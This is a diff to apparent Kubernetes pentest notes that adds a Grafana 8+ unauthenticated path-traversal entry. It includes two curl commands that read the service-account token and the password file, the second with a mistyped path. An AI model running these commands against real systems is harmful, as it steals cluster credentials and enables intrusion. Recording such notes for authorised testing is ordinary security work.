@@ -29,6 +29,15 @@ Nmap
 
 	30000-32767 - node port services, including Tiller
 
+	3000 - Grafana 
+		8+ is vulnerable to an LFI that's accessible without authentication. 
+ 
+		curl --path-as-is 127.0.0.1:3000/public/plugins/graph/../../../../../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+
+		curl --path-as-is 127.0.0.1:3000/public/plugins/graph/../../../../../../../../../../../../../et/passwd
+
+
+
 DNS
 	coredns on default kubeadm clusters listens on 10.96.0.10
 
